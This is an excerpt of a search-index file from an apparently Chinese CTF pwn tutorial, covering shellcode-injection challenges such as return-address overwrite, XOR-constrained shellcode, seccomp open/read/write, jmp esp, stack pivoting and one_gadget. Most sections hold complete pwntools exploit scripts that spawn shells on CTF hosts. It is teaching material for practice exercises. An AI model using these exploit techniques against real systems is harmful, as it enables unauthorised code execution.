<p>\u53cd\u7f16\u8bd1\u53d1\u73b0\u5c06\u7528\u6237\u8f93\u5165\u7684\u6570\u636e\u5f53\u4f5c\u51fd\u6570\u8c03\u7528</p> <p></p> <p>\u4f46\u662f\u6709\u957f\u5ea6\u9650\u5236\uff0c\u6784\u9020\u5b57\u8282\u5f62\u5f0f\u7684 payload</p> <pre><code>from pwn import *\n\np = remote('challenge.qsnctf.com', 32350)\ncontext(os='linux', arch='amd64', log_level='debug')\n\nshellcode = b\"\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\"\n\np.send(shellcode)\np.interactive()\n</code></pre>"},{"location":"Pwn/Chapter5/5-12/","title":"\u8fd4\u56de\u5730\u5740\u4e4b\u540e ShellCode \u6ce8\u5165","text":""},{"location":"Pwn/Chapter5/5-12/#\u8fd4\u56de\u5730\u5740\u4e4b\u540e-shellcode-\u6ce8\u5165","title":"\u8fd4\u56de\u5730\u5740\u4e4b\u540e ShellCode \u6ce8\u5165","text":"<p>IDA \u6253\u5f00\u53cd\u7f16\u8bd1</p> <p>\u53d1\u73b0 <code>buf</code> \u53d8\u91cf\u7684\u5730\u5740\u88ab <code>printf()</code> \u51fd\u6570\u8f93\u51fa\u4e86</p> <p>\u7136\u540e <code>read()</code>\u51fd\u6570\u8bfb\u53d6\u8f93\u5165\u5230\u53d8\u91cf <code>buf</code> \u4e2d</p> <p></p> <p><code>read()</code> \u51fd\u6570\u9650\u5236\u8f93\u5165 <code>0x400</code> \u4e2a\u5b57\u8282\uff0c\u663e\u7136\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e</p> <p></p> <p>\u68c0\u6d4b\u5230\u53ef\u80fd\u6ca1\u5f00 NX</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u6808\u662f\u53ef\u6267\u884c\u7684</p> <p></p> <p>\u5148\u63a5\u53d7\u6cc4\u9732\u7684 buf \u5730\u5740</p> <pre><code>buf_addr = p.recvuntil(\"]\")\nbuf_addr = int(buf_addr[-15: -1], 16)\n</code></pre> <p>\u6211\u4eec\u628a shellcode \u653e\u5728\u8fd4\u56de\u5730\u5740\u540e\u9762</p> <pre><code># 32 = buf \u5230 r \u5904\uff0824\uff09+ \u8fd4\u56de\u5730\u5740\u957f\u5ea6\uff088\uff09\nshellcode_addr = buf_addr + 32\n</code></pre> <p>\u5b8c\u6574 payload</p> <pre><code>from pwn import *\n\ncontext.log_level = \"debug\"\ncontext.arch = 'amd64'\n\n# p = process(\"./pwn\")\np = remote(\"challenge-119b305a737760fc.sandbox.ctfhub.com\", 33409)\n\nbuf_addr = p.recvuntil(\"]\")\nbuf_addr = int(buf_addr[-15: -1], 16)\n\nshellcode_addr = buf_addr + 32\nshellcode = asm(shellcraft.sh())\n\npayload = b'a' * 24 + p64(shellcode_addr) + shellcode\np.recv()\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"Pwn/Chapter5/5-2/","title":"\\x00 \u7ed5\u8fc7 strcmp()","text":""},{"location":"Pwn/Chapter5/5-2/#strcmp-\u7ed5\u8fc7\u6ce8\u5165","title":"Strcmp \u7ed5\u8fc7\u6ce8\u5165","text":"<p>\u9996\u5148\u8c03\u7528\u4e86 chall()</p> <p></p> <p>strcmp \u6bd4\u8f83\u51fd\u6570\u53ef\u4f7f\u7528 \\x00 \u7ed5\u8fc7</p> <p></p> <p>\u6700\u540e\u4ece src \u4e2d\u62f7\u8d1d 0x400 \u5b57\u8282\u5230 dest \u4e2d</p> <p></p> <p>gdb \u52a8\u6001\u8c03\u8bd5</p> <pre><code>from pwn import *\n\np = process('./ez_pz_hackover_2016')\n\ngdb.attach(p,'b *0x8048600')\n\np.recvuntil('crash: ')\n\nstack = int(p.recv(10),16)\n\nshellcode = asm(shellcraft.sh())\n\npayload = b'crashme\\x00' + b'aaaaa'\np.sendline(payload)\n\npause()\n</code></pre> <p>0x7263 \u662f cr\uff0cebp \u4e3a 0x38 \u8ddd\u79bb\u8f93\u5165\u5dee 0x38-0x20+0x2 = 0x16</p> <p></p> <p>\u7a0b\u5e8f\u5f00\u5934\u7ed9\u51fa\u4e86\u6808\u5730\u5740</p> <p></p> <p>\u6211\u4eec\u7684 shellcode \u5e94\u8be5\u5199\u5728 ebp \u4e4b\u540e\uff0832\u4f4d\u7a0b\u5e8f\u7684 ebp \u5360 4 \u4e2a\u5b57\u8282\uff09\uff0c\u5c31\u662f\u5728 0x16+0x4 \u5904</p> <p>\u6362\u53e5\u8bdd\u8bf4\u6211\u4eec\u5728\u8986\u76d6\u5b8c ebp \u540e\u7684\u8fd4\u56de\u5730\u5740\u5e94\u8be5\u586b\u5199\u6307\u5411 shellcode \u7684\u5730\u5740</p> <p>\u6211\u4eec\u8f93\u5165\u70b9\u8ddd\u79bb\u6211\u4eec\u7684\u8fd4\u56de\u5730\u5740\u7684\u8ddd\u79bb\u662f 0x3c - 0x20 = 0x1c</p> <p>\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u7528 oxffced7cc - 0x1c \u6765\u8868\u793a\u8fd4\u56de\u5730\u5740</p> <p></p> <p>\u6784\u9020 payload</p> <pre><code>from pwn import *\n\nr = remote('node5.buuoj.cn',27869)\n\nr.recvuntil('crash: ')\n\nstack = int(r.recv(10),16)\n\nshellcode = asm(shellcraft.sh())\n\npayload = b'crashme\\x00' + b'a' * (0x16 - 8 + 4) + p32(stack - 0x1c) + shellcode\n\nr.sendline(payload)\nr.interactive()\n</code></pre>"},{"location":"Pwn/Chapter5/5-3/","title":"XOR \u7f16\u7801\u6ce8\u5165","text":""},{"location":"Pwn/Chapter5/5-3/#xor-\u7f16\u7801\u6ce8\u5165","title":"XOR \u7f16\u7801\u6ce8\u5165","text":"<p>64IDA \u53cd\u7f16\u8bd1\uff0c\u51fd\u6570\u6846\u4e2d\u641c\u7d22\u5173\u952e\u5b57\u5b9a\u4f4d main \u51fd\u6570</p> <p> 1. \u8f93\u5165\u4ee3\u7801</p> <ol> <li> <p>\u68c0\u67e5 0,2,4..\u7684\u5947\u6570\u4f4d\u4e3a 0x80-0x7ff \u95f4 1,3,5...\u7684\u5076\u6570\u4f4d\u4e3a 0-0x7f \u7684acsii\u5b57\u7b26</p> </li> <li> <p>\u8c03\u7528 3 \u6b21 cin \u4e0d\u6e05\u695a\u4e3a\u5565\u611f\u89c9\u6ca1\u5565\u7528,\u53cd\u6b63\u8fd4\u56de\u90fd\u662f 0 \u4f5c\u4e3a 1 \u53c2 2 \u53c2 3 \u53c2\uff0c\u6d4b\u8bd5\u90fd\u662f 0\uff0c\u4e0d\u6e05\u695a\u8f93\u5565\u80fd\u5f97\u5230\u53c2\u6570\u3002\u611f\u89c9\u662f\u4e13\u95e8\u4e3a\u4e86\u6e05\u5bc4\u5b58\u5668\u7684</p> </li> </ol> <p>\u96be\u70b9\u5728\u4e8e\u5947\u6570\u4f4d\u53ea\u80fd\u8bf4\u7b2c 1 \u5b57\u8282 110 \u5f00\u5934\u7b2c 2 \u5b57\u8282 10 \u5f00\u5934</p> <p>\u60f3\u5230\u6709\u4e00\u4e2a\u4eba\u5199\u7684 shell \u7ed5\u8fc7\u7528\u7684 int 0x80 \u7684 32 \u4f4d\u8c03\u7528\uff0c\u5728 64 \u4f4d\u7cfb\u7edf\u91cc\u662f\u53ef\u4ee5\u76f4\u63a5\u7528 32 \u4f4d\u7684\u8c03\u7528\u7684</p> <p>\u800c\u53c2\u6570\u7528 xor eax,eax \u8fd9\u79cd\u90fd\u662f 1+Cx \u8fd9\u79cd\u540e\u8fb9\u8865\u4e2a nop(0x90) \u5c31OK\u4e86</p> <p>\u800c\u8c03\u7528 int 0x80 \u4e5f\u4e0d\u7528\u5f02\u6216</p> <p>32 \u4f4d\u7684\u8c03\u7528\u53c2\u6570\u4f7f\u7528 ebx,ecx,edx\uff0c\u4e2d\u65ad\u53f7 eax\uff0c\u5947\u8df3\u7528 leave;nop \u8fd9\u91cc\u7684 leave \u53ea\u80fd\u7528\u4e00\u6b21\uff0c\u597d\u5728\u5b83\u672c\u8eab\u6709\u4e2a\u94fe</p> <p>\u5982\u679c\u6ca1\u6709\u5c31\u5f97\u7528 xlatb \u8fd9\u4e2a\u4f1a\u7834\u574f al</p> <p>\u597d\u5728\u53ea\u7528\u5f00\u5934\u7528\u4e00\u6b21\uff0c\u540e\u8fb9\u5728\u5076\u6570\u4f4d\u968f\u4fbf\u5f04\u4e2a push \u5c31\u884c</p> <pre><code>from pwn import *\n\ncontext(arch='amd64')\n\np = remote('node5.buuoj.cn', 28407)\n\nshellcode = '''\nleave;nop;\nxor al,0xc7;nop;\nxor edx,eax;nop;\nxor al,0xc4;nop;   /* eax=sys_read=3, edx=0xc7*/\nxor ecx,ecx;nop;\nxor ecx,ebx;nop;   /* ecx=buf */\nxor ebx,ecx;nop;   /* ebx=0 */\npush rax;\nint 0x80  /* read(0,buf,0xc7) */\n'''\n\nb = asm(shellcode)\n\n# \u8f93\u5165\u4f1a\u5403\u6389\u4e00\u4f4d\np.sendlineafter(b\"What is your lucky number?\\n\", b'1' + b)\np.sendafter(b'Leave to fate...\\n',b'\\n\\n\\n')\np.send(b'\\x90'*0x20+asm(shellcraft.sh()))\np.interactive()\n</code></pre> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Pwn/Chapter5/5-4/","title":"SysCall \u7ed5\u8fc7 Prctl Seccomp","text":""},{"location":"Pwn/Chapter5/5-4/#syscall-\u7ed5\u8fc7-prctl-seccomp","title":"SysCall \u7ed5\u8fc7 Prctl Seccomp","text":"<p><code>prctl seccomp</code> \u76f8\u5f53\u4e8e\u5185\u6838\u4e2d\u7684\u4e00\u79cd\u5b89\u5168\u673a\u5236\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u7a0b\u5e8f\u53ef\u4ee5\u4f7f\u7528\u6240\u6709\u7684 <code>syscall</code></p> <p>\u4f46\u662f\u5f53\u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b\u4e4b\u540e\u901a\u8fc7 <code>exeve</code> \u6765\u547c\u53eb <code>syscall</code> \u5f97\u5230 shell \u65f6 <code>seccomp</code> \u4fbf\u6392\u4e0a\u4e86\u7528\u573a</p> <p>\u4ed6\u53ef\u4ee5\u8fc7\u6ee4\u6389\u67d0\u4e9b <code>syscall</code>\uff0c\u53ea\u5141\u8bb8\u4f7f\u7528\u90e8\u5206 <code>syscall</code></p> <p>\u672c\u9898\u7cfb\u7edf\u5185\u6838\u53ea\u5141\u8bb8\u4f7f\u7528 <code>sys_open\uff0csys_read\uff0csys_write</code></p> <p></p> <p>\u901a\u8fc7 open \u51fd\u6570\u6253\u5f00\u5f53\u524d\u76ee\u5f55\u4e0b\u7684 flag \u6587\u4ef6</p> <p>\u5728\u6587\u4ef6\u8bfb\u5199\u4e4b\u524d\uff0c\u6211\u4eec\u5fc5\u987b\u5148\u6253\u5f00\u6587\u4ef6</p> <p>\u4ece\u5e94\u7528\u7a0b\u5e8f\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u8fd9\u662f\u901a\u8fc7\u6807\u51c6\u5e93\u7684 open \u51fd\u6570\u5b8c\u6210\u7684\uff0c\u8be5\u51fd\u6570\u8fd4\u56de\u4e00\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26</p> <p>\u5185\u6838\u4e2d\u662f\u7531\u7cfb\u7edf\u8c03\u7528 <code>sys_open()</code> \u51fd\u6570\u5b8c\u6210</p> <pre><code>    # \u7b2c\u4e00\u90e8\u5206\uff1a\u5b9e\u73b0\n    char*file='flag';\n    sys_open(file,0,0);\n\n    xor ecx,ecx;\n    mov eax,0x5;     # eax = sys_open\n    push ecx;        # \u5b57\u7b26\u4e32\u7ed3\u5c3e\"\\00\"\n    push 0x67616c66; # \"flag\u5b57\u7b26\u4e32\u768416\u8fdb\u5236\u8868\u793a\uff0c\u7531\u4e8e\u5c0f\u7aef\u5e8f\uff0c\u6240\u4ee5\u662f\u4ece\u53f3\u5f80\u5de6\"\n    mov ebx,esp;     # ebx = const char __user *filename\n    xor edx,edx;     # edx  = int mode \u8bbe\u5b9a\u6743\u9650\u7684\n    int 0x80;\n</code></pre> <p>\u5229\u7528 read \u51fd\u6570\u8bfb\u53d6\u6587\u4ef6\u4e2d\u7684\u6570\u636e</p> <pre><code>    # \u7b2c\u4e8c\u90e8\u5206\uff1a\u5b9e\u73b0\n    sys_read(3,file,0x30);\n\n    mov eax,0x3; # eax = sys_read\n    mov ecx,ebx; # ecx = char __user *buf \u7f13\u51b2\u533a\uff0c\u8bfb\u51fa\u7684\u6570\u636e--&gt;\u4e5f\u5c31\u662f\u8bfb\u201cflag\u201d\n    mov ebx,0x3; # ebx = unsigned int fd = 3 \u6587\u4ef6\u63cf\u8ff0\u7b26\n    mov dl,0x30; # edx = size_t count \u5bf9\u5e94\u5b57\u8282\u6570\n    int 0x80;\n</code></pre> <p>\u5229\u7528 write \u51fd\u6570\u5c06\u6587\u4ef6\u4e2d\u7684\u6570\u636e\u6253\u5370\u5230\u5c4f\u5e55\u4e0a</p> <pre><code>    # \u7b2c\u4e09\u90e8\u5206\uff1a\u5b9e\u73b0\n    sys_write(1,file,0x30);\n\n    mov eax,0x4; # eax = sys_write\n    mov bl,0x1;  # ebx = unsigned int fd = 1\n    mov edx,0x30 # edx = size_t count\n    int 0x80;\n</code></pre> <pre><code>from pwn import *\n\np = remote('node5.buuoj.cn',29475)\n\ncontext(log_level = 'debug', arch = 'i386', os = 'linux')\n\nshellcode=\"\"\nshellcode += asm('xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66; mov ebx,esp;xor edx,edx;int 0x80;')\nshellcode += asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;')\nshellcode += asm('mov eax,0x4;mov bl,0x1;mov edx,0x30;int 0x80;')\n\nrecv = p.recvuntil(':')\np.sendline(shellcode)\nprint(p.recv(100))\n</code></pre> <p>\u8fd8\u53ef\u4ee5\u5229\u7528 shellcraft</p> <pre><code>from pwn import *\n\nr = remote('node5.buuoj.cn',29475)\n\nelf = ELF('orw')\n\nshellcode = shellcraft.open('/flag')\nshellcode += shellcraft.read('eax','esp',100)\nshellcode += shellcraft.write(1,'esp',100)\nshellcode = asm(shellcode)\n\nr.sendline(shellcode)\nr.interactive()\n</code></pre>"},{"location":"Pwn/Chapter5/5-5/","title":"Call eax \u6ce8\u5165","text":""},{"location":"Pwn/Chapter5/5-5/#call-eax-\u6ce8\u5165","title":"Call eax \u6ce8\u5165","text":"<p>gdb \u4e2d\u6b63\u5e38 run \u7a0b\u5e8f\u7ed3\u679c\u62a5\u9519</p> <p></p> <p>IDA \u4e2d\u65e0\u6cd5\u89e3\u6790 main() \u51fd\u6570\uff0c\u53ea\u80fd\u770b\u6c47\u7f16\u4ee3\u7801</p> <p>\u4ee3\u7801\u6253\u5370\u4e86 <code>\"Thanks\u2026\u2026\"</code> \u540e\u62a5\u9519\uff0c\u6240\u4ee5\u5f80\u8fd9\u540e\u9762\u770b\u53d1\u73b0 <code>call eax</code> \u5f53\u4f5c\u51fd\u6570\u6267\u884c\u4e86</p> <p></p> <p>\u53bb vuln \u4e2d\u67e5\u770b\u53d1\u73b0 <code>[ebp+var_A0]</code> \u662f\u7528\u6237\u8f93\u5165\u7684\u5730\u5740</p> <p></p> <p>\u5982\u679c\u6211\u4eec\u5728\u8fd9\u91cc\u76f4\u63a5\u6ce8\u5165 shellcode \u7684\u8bdd\u540e\u9762 call \u8c03\u7528\u4f1a\u76f4\u63a5\u6267\u884c\uff0c\u6784\u9020 payload</p> <pre><code>from pwn import *\n\np = remote('node5.buuoj.cn', 26750)\n\npayload = asm(shellcraft.sh())\n\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"Pwn/Chapter5/5-6/","title":"Jmp esp GetShell","text":""},{"location":"Pwn/Chapter5/5-6/#jmp-esp-getshell","title":"Jmp esp GetShell","text":"<p>\u660e\u663e\u5b58\u5728\u6808\u6ea2\u51fa</p> <p> <pre><code>context(log_level = 'debug', arch = 'i386', os = 'linux')\nshellcode=asm(shellcraft.sh())\n</code></pre></p> <p>\u4f46\u662f\u957f\u5ea6\u8fc7\u591a</p> <p></p> <p>\u8fd9\u6837\u5199 shellcode \u7684\u957f\u5ea6\u5f88\u77ed\uff0c\u80fd\u591f\u5199\u5165\u6808</p> <pre><code>shellcode ='''\nxor eax,eax               # eax \u7f6e 0\nxor edx,edx              # edx \u7f6e 0\npush edx                 # \u5c06 0 \u5165\u6808\uff0c\u6807\u8bb0\u4e86 \"/bin/sh\"\u7684\u7ed3\u5c3e\npush 0x68732f2f           # \u4f20\u9012 \"/sh\"\uff0c\u4e3a\u4e86 4 \u5b57\u8282\u5bf9\u9f50\uff0c\u4f7f\u7528 //sh\uff0c\u8fd9\u5728 execve() \u4e2d\u7b49\u540c\u4e8e /sh\npush 0x6e69622f           # \u4f20\u9012 \"/bin\"\u201d\nmov ebx,esp               # \u6b64\u65f6 esp \u6307\u5411\u4e86 \"/bin/sh\"\uff0c\u901a\u8fc7 esp \u5c06\u8be5\u5b57\u7b26\u4e32\u7684\u503c\u4f20\u9012\u7ed9 ebx\nmov al,0xB                # eax \u7f6e\u4e3a execve \u51fd\u6570\u7684\u4e2d\u65ad\u53f7\nint 0x80                  # \u8c03\u7528\u8f6f\u4e2d\u65ad\n'''\nshellcode = asm(shellcode)\n</code></pre> <p>\u5728 hint \u4e2d\u53d1\u73b0\u6709\u4e2a <code>jmp esp</code></p> <p></p> <p>shellcode \u73b0\u5728\u5199\u5165\u6808\u4e86\uff0c\u56e0\u4e3a esp \u5bc4\u5b58\u5668\u6307\u5411\u6808\u9876</p> <p>\u73b0\u5728\u5c06\u8fd4\u56de\u5730\u5740\u5199\u6210 jump_esp\uff0c\u91cd\u65b0\u8df3\u5230\u6808\u4e0a</p> <p>\u624b\u52a8\u5199\u5165 <code>sub esp,40;call esp</code> \u5f00\u6808\u6267\u884c\uff0c\u5373\u53ef\u83b7\u53d6 shell</p> <pre><code>payload = shellcode.ljust(0x24,'\\x00')+p32(jump_esp)\npayload += asm(\"sub esp,40;call esp\")\n</code></pre> <pre><code>from pwn import *\n\np = remote('node5.buuoj.cn',25741)\n\ncontext(arch='i386',os='linux')\njump_esp = 0x8048554\n\nshellcode = '''\nxor eax,eax\nxor edx,edx\npush edx\npush 0x68732f2f\npush 0x6e69622f\nmov ebx,esp\nmov al,0xB\nint 0x80\n'''\n\nshellcode = asm(shellcode)\n\npayload = shellcode.ljust(0x24,b'\\x00') + p32(jump_esp)\n\npayload += asm(\"sub esp,40;call esp\")\n\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"Pwn/Chapter5/5-7/","title":"\u5185\u5e73\u6808\u6ce8\u5165","text":""},{"location":"Pwn/Chapter5/5-7/#\u5185\u5e73\u6808\u6ce8\u5165","title":"\u5185\u5e73\u6808\u6ce8\u5165","text":"<p>\u6ca1\u6cd5\u53cd\u7f16\u8bd1\u4e3a\u4f2a\u4ee3\u7801</p> <p></p> <p>\u4e00\u5f00\u59cb\u8c03\u7528 write \u51fd\u6570\u8f93\u51fa\u4e86 let\u2019s start the ctf</p> <p>4 \u662fwrite\u51fd\u6570\u7684\u8c03\u7528\u53f7\uff0c\u4e4b\u540e\u7684\u8c03\u7528\u53f7\u662f 3\uff0c\u8c03\u7528\u4e86 read \u51fd\u6570</p> <p>\u6211\u4eec\u77e5\u9053 dl \u8fd9\u4e2a\u5bc4\u5b58\u5668\u662f\u63a7\u5236\u8f93\u5165\u5b57\u7b26\u7684\u591a\u5c11\u7684\uff0c\u4e5f\u5c31\u662f\u6240\u6211\u4eec\u53ef\u4ee5\u8f93\u5165 0x3c \u4e2a\u5b57\u7b26</p> <pre><code>write(1\uff0cbuf\uff0c0x14)\nread(0\uff0cbuf\uff0c0x3C)\n</code></pre> <p>\u901a\u8fc7\u6700\u540e\u7684 add esp,14h \u6211\u4eec\u53ef\u4ee5\u77e5\u9053 esp \u8ddd\u79bb ret \u7684\u5730\u5740 0x14 \u4e2a\u5b57\u8282\uff08\u5185\u5e73\u6808\uff09</p> <p></p> <p>\u4e5f\u5c31\u662f\u6211\u4eec\u8f93\u5165\u7684\u53c2\u6570 buf \u7684\u5927\u5c0f\u53ea\u6709 0x14\uff0c\u4f46\u662f\u6211\u4eec\u8bfb\u5165\u4e86 0x3c\uff0c\u5b58\u5728\u6ea2\u51fa\u6f0f\u6d1e</p> <p><code>0x8048087</code> \u4e4b\u524d\u6808\u4e0a\u538b\u5165\u4e86 7 \u4e2a\u6570\u636e\uff0c\u4e4b\u540e read()\u3001write() \u51fd\u6570\u8c03\u7528\u5b8c\u540e esp \u59cb\u7ec8\u6ca1\u6709\u53d8\u5316\uff0c\u76f4\u5230\u51fa\u73b0\u4e86 <code>add esp,0x14</code></p> <p>\u8fd9\u4f7f\u5f97 esp \u6b64\u65f6\u6307\u5411\u7b2c\u4e8c\u4e2a\u538b\u5165\u7684\u6570\u636e\uff0c\u4e5f\u5c31\u662f <code>offset _exit</code> \u7684\u5730\u5740</p> <p></p> <p>\u5176\u4e0a\u9762\u5c31\u662f\u7b2c\u4e00\u6b21\u538b\u5165\u7684\u6570\u636e\uff08\u6808\u7684\u5730\u5740\uff0c\u5c31\u662f\u5373\u5c06\u88ab\u6cc4\u9732\u7684\u6808\u7684\u5730\u5740\uff09</p> <p></p> <p>\u5982\u4e0a\uff0c\u6808\u7b2c\u4e8c\u4e2a\u5730\u65b9\u5b58\u7684\u5c31\u662f\u7b2c\u4e00\u4e2a\u88ab\u538b\u5165\u7684\u6570\u636e\uff0c\u4e5f\u5c31\u662f\u5176\u4e0b\u9762\u7684\u6808\u7684\u5730\u5740</p> <p>\u7531\u4e8e\u4f7f\u7528\u7684\u5185\u5e73\u6808\uff0c\u6ca1\u6709 ebp\uff0c\u8986\u76d6\u5b8c buf \u540e\u5c31\u662f ret\uff0c\u5176\u5b9e\u770b\u4e0a\u65b9\u7684\u6c47\u7f16\u5c31\u77e5\u9053\u4e86</p> <p>\u8fd9\u53e5 payload \u5c06\u7a0b\u5e8f\u6267\u884c\u6d41\u8f6c\u5230\u4e86\u53bb\u6267\u884c write \u51fd\u6570</p> <p>\u6240\u4ee5\u5f53 paylaod \u53d1\u9001\u65f6\uff0c\u8fd4\u56de <code>0x08048087: mov ecx, esp ; addr</code> \u5230\u8fd9\u91cc\u6267\u884c</p> <p>\u4f7f ecx \u6307\u5411\u6808\u9876\uff0c\u6b64\u65f6\u6808\u9876\u5c31\u662f\u7b2c\u4e00\u4e2a\u88ab\u538b\u5165\u7684\u6570\u636e\uff0c\u5b58\u7684\u6b63\u662f\u6808\u7684\u521d\u59cb\u5730\u5740\uff0c\u53ef\u4ee5\u88ab\u6cc4\u9732</p> <pre><code>mov_ecx_esp = 0x08048087\n\npayload = b'a' * 0x14 + mov_ecx_esp\n\np.sendafter(':', payload)\n</code></pre> <p></p> <p>\u56e0\u4e3a\u7b2c\u4e8c\u6b21\u6267\u884c\u5b8c read \u4e4b\u540e\u6267\u884c\u4e86 <code>add esp,14h</code></p> <p>\u6b64\u65f6 esp \u6307\u5411\u7684\u5c31\u662f\u5373\u5c06\u6267\u884c\u7684 shellcode \u7684\u5730\u5740\uff0c\u800c shellcode \u7684\u5730\u5740\u6b63\u662f\u6cc4\u9732\u7684 <code>stack_addr + 0x14</code></p> <pre><code>shellcode = '''\nxor ecx,ecx\nxor edx,edx\npush edx\npush 0x68732f6e\npush 0x69622f2f\nmov ebx,esp\nmov al,0xb\nint 0x80\n'''\n\nshellcode = asm(shellcode)\n\npayload = b'A' * 0x14 + p32(stack_addr + 0x14) + shellcode\n\np.send(payload)\np.interactive()\n</code></pre> <p>\u5b8c\u6574 payload</p> <pre><code>from pwn import *\n\np = process('./start')\n#p = remote('node5.buuoj.cn',29955)\n\npayload = b'A' * 0x14 + p32(0x8048087)\n\np.sendafter(\"Let's start the CTF:\",payload)\n\nstack_addr = u32(p.recv(4))\n\nprint(hex(stack_addr))\ngdb.attach(p)\n\nshellcode = '''\nxor ecx,ecx\nxor edx,edx\npush edx\npush 0x68732f6e\npush 0x69622f2f\nmov ebx,esp\nmov al,0xb\nint 0x80\n'''\n\nshellcode = asm(shellcode)\n\npayload = b'A' * 0x14 + p32(stack_addr + 0x14) + shellcode\n\np.send(payload)\np.interactive()\n</code></pre>"},{"location":"Pwn/Chapter5/5-8/","title":"One_gadget \u6ce8\u5165","text":""},{"location":"Pwn/Chapter5/5-8/#one_gadget-\u6ce8\u5165","title":"One_gadget \u6ce8\u5165","text":"<p>\u53cd\u7f16\u8bd1\u53ea\u591f\u6ea2\u51fa 0x10\uff0c\u7b2c\u4e8c\u4e2a read \u653e\u5230\u4e86 bss \u6bb5</p> <p></p> <p>\u9996\u5148\u5229\u7528 pit \u8868\u4e2d\u7684 puts \u51fd\u6570\u6cc4\u9732 libc\uff0c\u5f97\u5148\u627e <code>pop rdi</code> \u6307\u4ee4</p> <p></p> <p>\u5176\u6b21\u6808\u8fc1\u79fb\u9700\u8981 leave \u6307\u4ee4</p> <p></p> <p>\u5148\u6784\u9020 payload \u8fc1\u79fb\u6808\u5230 bss \u6bb5</p> <pre><code>r.recvuntil('u want')\n\npayload = b'a' * 0x60 + p64(bank_addr) + p64(leave)\n\nr.send(payload)\n</code></pre> <p>\u7b2c\u4e00\u6b21\u6ea2\u51fa</p> <p></p> <p>\u9700\u8981\u6ce8\u610f\u4e0d\u80fd\u5c06\u6808\u8fc1\u79fb\u5230\u53d8\u91cf bank \u7684\u5f00\u5934\uff0c\u56e0\u4e3a\u540e\u9762\u8fd8\u9700\u8981\u8c03\u7528 puts \u7b49\u51fd\u6570\uff0c\u5f80\u4e0a\u53ef\u80fd\u4f1a\u8986\u76d6\u67d0\u4e9b\u91cd\u8981\u6570\u636e\uff0c\u56e0\u6b64\u8fc1\u79fb\u7684\u5730\u5740\u5e94\u8be5\u5c3d\u91cf\u9760\u540e</p> <p>bank \u7684\u5730\u5740\u8ddd\u79bb got \u8868\u5f88\u8fd1\uff0c\u53ea\u9694\u7740 0x30 \u7684\u8ddd\u79bb\uff0c\u800c\u8c03\u7528 puts \u5f88\u5403\u6808\u7a7a\u95f4\uff0c\u56e0\u6b64\u6211\u4eec\u5728\u505a\u6808\u8fc1\u79fb\u7684\u65f6\u5019\u8981\u628a\u5730\u5740\u76f8\u5bf9\u7684\u62ac\u9ad8\u4e9b</p> <p></p> <p>\u518d\u627e\u627e ret \u6307\u4ee4\uff0c\u76f8\u5f53\u4e8e</p> <pre><code>pop eip # \u7ed9 eip \u8d4b\u503c\n</code></pre> <p></p> <p>\u4e4b\u540e\u518d\u5728 bss \u6bb5\u4e2d\u6784\u9020\u6cc4\u9732 libc \u7684 payload</p> <p>\uff08\u53ea\u8981 p64(ret) * num \u4e2d 28 &gt;= num &gt;= 20 \u5373\u53ef\uff09</p> <pre><code>r.recvuntil('now!')\n\npayload = p64(ret) * 21 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)\n\nr.send(payload)\nr.recvline()\n\nputs_addr = u64(r.recv(6).ljust(8,b'\\x00'))\nprint(hex(puts_addr))\n</code></pre> <p>\u4e4b\u540e\u5c31\u662f libc \u57fa\u5740\u4e86</p> <pre><code>libc = LibcSearcher('puts', pus_addr)\nlibc_base = pus_addr - libc.dump('puts')\n</code></pre> <p>\u4f46\u662f\u8fd9\u9898\u4e0d\u80fd ROP\uff0c\u53ea\u80fd one_gadget\uff08\u53ef\u80fd\u662f\u7a7a\u95f4\u4e0d\u591f\uff09</p> <p>\u6ce8\u610f\uff1aone_gadget \u662f\u9700\u8981\u8fde ebp \u4e00\u8d77\u8986\u76d6\u7684</p> <p></p> <p>\u5b8c\u6574 payload</p> <pre><code>from pwn import *\nfrom LibcSearcher import *\n\nr = remote('node5.buuoj.cn',26424)\n#r = process('./gyctf_2020_borrowstack')\n\nelf = ELF('./gyctf_2020_borrowstack')\nbank_addr = 0x0601080\nleave = 0x400699\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\npop_rdi = 0x400703\nmain = 0x0400626\nret = 0x4004c9\n\nr.recvuntil('u want')\n\npayload = b'a' * 0x60 + p64(bank_addr) + p64(leave)\n\nr.send(payload)\nr.recvuntil('now!')\n\npayload = p64(ret) * 28 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)\n\nr.send(payload)\nr.recvline()\n\nputs_addr = u64(r.recv(6).ljust(8,b'\\x00'))\nprint(hex(puts_addr))\n\nlibc = LibcSearcher('puts',puts_addr)\nlibc_base = puts_addr - libc.dump('puts')\n\none_gadget = libc_base + 0x4526a\n\npayload = b'a' * (0x60 + 8) + p64(one_gadget)\n\nr.send(payload)\nr.interactive()\n</code></pre>"},{"location":"Pwn/Chapter5/5-9/","title":"Bss \u6bb5\u6ce8\u5165","text":""},{"location":"Pwn/Chapter5/5-9/#bss-\u6bb5\u6ce8\u5165","title":"Bss \u6bb5\u6ce8\u5165","text":"<p>\u6ca1\u5f00 NX</p> <p></p> <p></p> <p>\u4e0a\u811a\u672c</p> <pre><code>from pwn import * \n\nsh = remote('61.147.171.105',61275)\n\n# \u901a\u8fc7\u8f93\u5165 name \u5411 BSS \u6bb5\u5199\u5165 shellcode\ncontext.arch = 'amd64'\nshellcode = asm(shellcraft.sh())\n\nsh.sendlineafter('name :',shellcode)\n\n# \u901a\u8fc7\u8f93\u5165\u5185\u5bb9\u6ea2\u51fa\u4fee\u6539\u63a7\u5236\u53d8\u91cf\u503c\uff0c\u6cc4\u9732 main 